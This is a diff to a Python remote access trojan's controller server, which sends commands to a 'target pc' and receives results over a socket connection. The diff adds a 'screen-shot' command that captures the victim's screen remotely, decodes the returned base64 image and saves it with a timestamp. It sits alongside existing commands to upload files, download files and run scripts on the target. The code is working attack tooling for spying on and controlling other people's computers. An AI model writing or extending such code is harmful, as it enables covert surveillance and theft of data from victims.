@@ -9,6 +9,10 @@ import base64
 import re
 import os
 from prettytable import PrettyTable
+from PIL import Image, ImageGrab
+import io
+from datetime import datetime
+
 
 
 NUMBER_OF_THREADS = 2
@@ -84,6 +88,20 @@ def reliable_receive(s):
         except json.JSONDecodeError:
             # JSON decoding failed, continue receiving data
             continue
+        
+def convert_string_to_image_and_save(screenshot_string, file_path):
+    try:
+        screenshot_bytes = base64.b64decode(screenshot_string.encode())
+        screenshot_image = Image.open(io.BytesIO(screenshot_bytes))
+        screenshot_image.save(file_path, "PNG")
+        return "Image saved successfully"
+    except base64.binascii.Error:
+        return "Invalid Base64 string. Unable to decode."
+    except FileNotFoundError:
+        return "File path not found. Please provide a valid file path."
+    except Exception as e:
+        cprint(f"Failed: {str(e)}", "red")
+        return "Image saving failed."
 
 
 def create_file_script():
@@ -255,6 +273,9 @@ def isCorrectArgument(command_user,command):
 
     elif command_user == "show-script":
         correct_command = len(command) == 1
+        
+    elif command_user == "screen-shot":
+        correct_command = len(command) == 1
     else:
         correct_command = True
 
@@ -295,6 +316,7 @@ def send_target_commands(conn):
             if command_user == "upload":
                 file_content = read_file(command[1])
                 command.append(file_content.decode())
+                                
 
             if command_user == "run":
                 files_script_dict = create_file_script()
@@ -317,13 +339,25 @@ def send_target_commands(conn):
                 cprint(location, "red", attrs=["bold"], end="")
                 continue
 
-            if command_user == "download":
+            if command_user == "download" and "[Error]" not in result_from_client[0]:
                 file_path = command[2]
                 file_name = os.path.basename(command[1])
                 file_path = os.path.join(file_path, file_name)
 
                 result_from_client = [write_file(
                     path=file_path, content=result_from_client[0]), result_from_client[1]]
+                
+            if command_user == "screen-shot" and "[Error]" not in result_from_client[0]:
+                screenshot_string = result_from_client[0]
+                
+                timestamp = datetime.now().strftime("%Y_%m_%d_%HH_%MM_%SS_")
+                image_name = f"screenshot_{timestamp}.png"
+                
+                path = os.path.normpath(f"screenshot/{image_name}")
+                
+                result_from_client[0] = convert_string_to_image_and_save(screenshot_string, path) 
+                
+            
 
         except Exception as ex:
             print(colored("Connection was lost", "red"))
@@ -349,6 +383,7 @@ def show_list_command():
     table.add_row(
         ["show-script", "show all script to run on target pc", "show-script"])
     table.add_row(["run", "run script on target pc", "run [script name]"])
+    table.add_row(["screen-shot", "take screen shot on target pc", "screen-shot"])
 
     table.align["Command"] = "l"
     table.align["Description"] = "l"
